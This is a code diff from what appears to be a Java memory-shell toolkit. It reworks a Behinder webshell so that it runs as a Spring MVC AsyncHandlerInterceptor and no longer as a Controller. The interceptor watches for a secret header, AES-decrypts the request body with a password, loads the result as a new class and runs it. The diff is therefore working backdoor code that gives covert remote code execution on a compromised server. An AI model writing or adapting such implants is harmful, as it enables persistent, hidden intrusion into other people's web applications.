@@ -1,7 +1,7 @@
-package com.reajason.javaweb.memshell.springmvc.behinder;
+package com.reajason.javaweb.memshell.springwebmvc.behinder;
 
+import org.springframework.web.servlet.AsyncHandlerInterceptor;
 import org.springframework.web.servlet.ModelAndView;
-import org.springframework.web.servlet.mvc.Controller;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -16,7 +16,7 @@ import java.util.Map;
  * @author ReaJason
  * @since 2024/12/22
  */
-public class BehinderControllerHandler extends ClassLoader implements Controller {
+public class BehinderInterceptor extends ClassLoader implements AsyncHandlerInterceptor {
     public static String pass;
     public static String headerName;
     public static String headerValue;
@@ -26,15 +26,16 @@ public class BehinderControllerHandler extends ClassLoader implements Controller
         return super.defineClass(b, 0, b.length);
     }
 
-    public BehinderControllerHandler(ClassLoader c) {
+    public BehinderInterceptor(ClassLoader c) {
         super(c);
     }
 
 
-    public BehinderControllerHandler() {
+    public BehinderInterceptor() {
     }
 
-    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
         if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
             try {
                 HttpSession session = request.getSession();
@@ -46,13 +47,15 @@ public class BehinderControllerHandler extends ClassLoader implements Controller
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
                 byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
-                Object instance = (new BehinderControllerHandler(this.getClass().getClassLoader())).g(bytes).newInstance();
+                Object instance = (new BehinderInterceptor(this.getClass().getClassLoader())).g(bytes).newInstance();
                 instance.equals(obj);
             } catch (Exception e) {
                 e.printStackTrace();
             }
+            return false;
+        } else {
+            return true;
         }
-        return null;
     }
 
     public HttpServletResponse getInternalResponse(HttpServletResponse response) {
@@ -85,6 +88,16 @@ public class BehinderControllerHandler extends ClassLoader implements Controller
         }
     }
 
+    @Override
+    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
+
+    }
+
+    @Override
+    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
+
+    }
+
     @SuppressWarnings("all")
     public static byte[] base64Decode(String bs) {
         byte[] value = null;
@@ -102,5 +115,10 @@ public class BehinderControllerHandler extends ClassLoader implements Controller
             }
         }
         return value;
+    }
+
+    @Override
+    public void afterConcurrentHandlingStarted(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+
     }
 }
